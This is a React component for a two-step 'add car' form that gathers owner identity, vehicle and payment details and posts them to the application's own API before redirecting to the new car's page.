import axios from "axios";
import { useState } from "react";
import toast from "react-hot-toast";
import { useHistory } from "react-router-dom";
import { API_URL } from "../../utils/variables";
import AddCarFirst from "./page1";
import AddCarSecond from "./page2";

const AddCarPage = () => {
  const history = useHistory();

  const [page, setPage] = useState(1);
  const [details, setDetails] = useState({
    name: "",
    nationality: "",
    dob: "",
    phone: "",
    address: "",
    nin: "",
    passport: "",
    idcard: "",
    model: "",
    plate: "",
    color: "",
    date_of_purchase: "",
    spec: "",
    card: "",
    exp: "",
    cvv: "",
    bvn: "",
    bank_name: "",
  });

  const handleChange = (e) => {
    setDetails({ ...details, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    axios
      .post(`${API_URL}/api/car/add`, details)
      .then((response) => {
        history.push(`/car/${response.data.slug}`);
      })
      .catch((err) => {
        toast.error("An error occurred while submitting");
      });
  };

  return (
    <div>
      {page === 1 ? (
        <AddCarFirst
          details={details}
          onChange={handleChange}
          next={() => setPage(2)}
        />
      ) : (
        <AddCarSecond
          details={details}
          onChange={handleChange}
          back={() => setPage(1)}
          submit={handleSubmit}
        />
      )}
    </div>
  );
};

export default AddCarPage;
